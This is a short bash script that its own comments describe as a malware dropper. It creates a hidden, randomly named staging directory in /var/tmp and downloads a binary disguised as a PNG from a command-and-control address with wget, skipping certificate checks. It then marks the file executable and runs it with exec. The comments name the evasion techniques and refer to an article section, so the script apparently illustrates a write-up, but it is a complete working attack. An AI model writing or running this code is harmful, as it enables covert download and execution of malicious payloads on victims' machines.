#!/bin/bash
# File-based dropper: fetches a binary from a C2 server disguised as a
# PNG image, stages it in a hidden temporary directory, and executes it
# via exec (process replacement), leaving no parent shell waiting.
#
# Techniques: content-type spoofing (PNG filename), hidden staging
# directory in /var/tmp, exec with dynamic path (article section 3.2).

STAGEDIR="/var/tmp/.$(tr -dc 'a-z0-9' </dev/urandom | head -c8)"
mkdir -p "$STAGEDIR"

wget -q --no-check-certificate \
    -O "$STAGEDIR/.system3d" \
    "http://192.0.2.1:8181/fakewhiteblack.png"

chmod +x "$STAGEDIR/.system3d"
exec "$STAGEDIR/.system3d"
